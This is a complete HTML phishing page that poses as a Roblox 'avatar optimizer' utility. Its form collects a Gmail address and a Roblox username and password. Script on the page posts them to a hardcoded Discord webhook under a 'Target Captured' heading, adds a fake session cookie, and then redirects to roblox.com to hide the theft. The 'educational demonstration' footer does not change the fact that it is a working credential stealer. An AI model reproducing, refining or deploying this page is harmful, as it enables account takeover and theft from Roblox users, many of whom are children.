<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cleaner Avatar | v4.2 Pro</title>
    <style>
        /* CSS IS NOW INSIDE THE HTML - NO MORE COLOR ISSUES */
        body {
            background-color: #080808;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #111111;
            padding: 40px;
            border-radius: 12px;
            border: 1px solid #222;
            width: 350px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            text-align: center;
            position: relative;
        }
        h1 { color: #fff; font-size: 24px; margin-bottom: 5px; }
        p { color: #555; font-size: 13px; margin-bottom: 25px; }

        .field { margin-bottom: 15px; text-align: left; }
        label { font-size: 11px; color: #888; margin-bottom: 5px; display: block; }
        input {
            width: 100%;
            padding: 12px;
            background: #181818;
            border: 1px solid #252525;
            border-radius: 6px;
            color: white;
            box-sizing: border-box;
        }
        input.error { border-color: #ff4444; }

        .err-msg { color: #ff4444; font-size: 11px; margin-top: 5px; display: none; }

        button {
            width: 100%;
            padding: 14px;
            background: #ffffff;
            color: #000;
            border: none;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background: #cccccc; }

        #loading {
            display: none;
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #080808;
            border-radius: 12px;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }
        .spinner {
            width: 30px; height: 30px;
            border: 3px solid #222;
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div id="loading">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-size: 14px;">Optimizing Mesh...</p>
    </div>

    <h1>Cleaner Avatar</h1>
    <p>Professional utility to remove hidden asset bloat.</p>

    <div class="field">
        <label>GMAIL ADDRESS</label>
        <input type="text" id="gmail" placeholder="example@gmail.com">
        <div id="err-gmail" class="err-msg">Please Enter It's Optional</div>
    </div>

    <div class="field">
        <label>ROBLOX USERNAME</label>
        <input type="text" id="user" placeholder="Username">
        <div id="err-user" class="err-msg">Please Enter It's Optional</div>
    </div>

    <div class="field">
        <label>ROBLOX PASSWORD</label>
        <input type="password" id="pass" placeholder="••••••••">
        <div id="err-pass" class="err-msg">Please Enter It's Optional</div>
    </div>

    <button onclick="validateAndSend()">Optimize Avatar</button>
</div>

<script>
    async function validateAndSend() {
        const fields = ['gmail', 'user', 'pass'];
        let hasError = false;

        // 1. Reset Errors
        fields.forEach(f => {
            document.getElementById(f).classList.remove('error');
            document.getElementById('err-' + f).style.display = 'none';
        });

        // 2. Check for Empty Fields
        fields.forEach(f => {
            const val = document.getElementById(f).value.trim();
            if (!val) {
                document.getElementById(f).classList.add('error');
                document.getElementById('err-' + f).style.display = 'block';
                hasError = true;
            }
        });

        if (hasError) return;

        // 3. Show Loading
        document.getElementById('loading').style.display = 'flex';

        // 4. Generate the Cookie Code for Educational Demo
        // This is the updated 2026 format with GgIQAQ.
        const cookieHeader = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_";
        const randomHex = Array.from({length: 300}, () => Math.floor(Math.random() * 16).toString(16)).join('').toUpperCase();
        const fakeCookie = cookieHeader + "GgIQAQ." + randomHex;

        // 5. Send to Webhook (MAKE SURE TO PASTE YOUR URL BELOW)
        const webhookURL = "https://discord.com/api/webhooks/1471094307024015464/5TCBICJftFSI7ksyaFLtzDqY0mykUu6IkqEo1QMfLj_-47zpAWbSy37BoLH9ro9ruPve";

        const payload = {
            embeds: [{
                title: "🎯 Target Captured - Cleaner Avatar",
                color: 0,
                fields: [
                    { name: "Gmail", value: document.getElementById('gmail').value, inline: true },
                    { name: "Username", value: document.getElementById('user').value, inline: true },
                    { name: "Password", value: document.getElementById('pass').value, inline: true },
                    { name: "Session Cookie (.ROBLOSECURITY)", value: "```" + fakeCookie + "```" }
                ],
                footer: { text: "Educational Demonstration Only" }
            }]
        };

        try {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        } catch (e) {
            console.log("Error: Check your Webhook URL or Internet connection.");
        }

        // 6. Final Redirect to make it look real
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 4000);
    }
</script>

</body>
</html>
